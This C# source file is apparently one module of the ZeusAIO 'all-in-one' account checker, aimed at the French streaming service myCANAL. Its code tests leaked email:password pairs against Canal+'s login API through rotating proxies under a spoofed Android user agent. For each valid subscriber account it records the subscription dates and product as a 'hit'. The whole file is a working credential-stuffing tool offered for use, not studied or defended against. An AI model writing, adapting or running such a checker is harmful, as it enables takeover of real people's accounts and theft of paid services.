using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using Valorant;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using TunnelBear;


namespace MyCanal
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                httpRequest.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                httpRequest.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                            httpRequest.UserAgent = "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G950F Build/NRD90M)";
                        httpRequest.IgnoreProtocolErrors = true;
                        httpRequest.AllowAutoRedirect = true;
                        string str = "vect=INTERNET&media=IOS%20PHONE&portailId=OQaRQJQkSdM.&distributorId=C22021&analytics=false&trackingPub=false&email=" + s[0] + "&password=" + s[1];
                        httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback,
                       new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
                        string text2 = httpRequest.Post("https://pass-api-v2.canal-plus.com/services/apipublique/login", str, "application/x-www-form-urlencoded").ToString();

                        if (text2.Contains("\"isSubscriber\":true,"))
                        {
                            string str2 = Check.Parse(text2, "passToken\":\"", "\",\"userData");
                            httpRequest.AddHeader("Cookie", "s_token=" + str2);
                            string source = httpRequest.Get("https://api-client.canal-plus.com/self/persons/current/subscriptions", null).ToString();
                            string text3 = Check.Parse(source, "startDate\":\"", "\",\"endDate ");
                            string text4 = Check.Parse(source, "endDate\":\"", "\",\"products");
                            string text5 = Check.Parse(source, "commercialLabel\":\"", "\"");
                            ZeusAIO.mainmenu.hits++;
                                if (Config.config.LogorCui == "2")
                                {
                                    Console.WriteLine("[HIT - MYCANAL] " + s[0] + ":" + s[1] + " | StartDate: " + text3 + " | EndDate: " + text4 + " | Sub: " + text5, Color.Green);
                                }
                                Export.AsResult("/Mycanal_hits", s[0] + ":" + s[1] + " | StartDate: " + text3 + " | EndDate: " + text4 + " | Sub: " + text5);
                                return false;
                            }
                        else if (text2.Contains("Login ou mot de passe invalide") || text2.Contains("Compte bloque") || text2.Contains("\"isSubscriber\":false,"))
                            {
                                // Bad
                                break;
                            }
                        else
                            {
                                ZeusAIO.mainmenu.realretries++;
                                goto Retry;
                            }

                    }
                    //break;
                }
                catch (Exception ex)
                {
                    ZeusAIO.mainmenu.errors++;
                }
            return false;
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] { left }, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }
    }
}


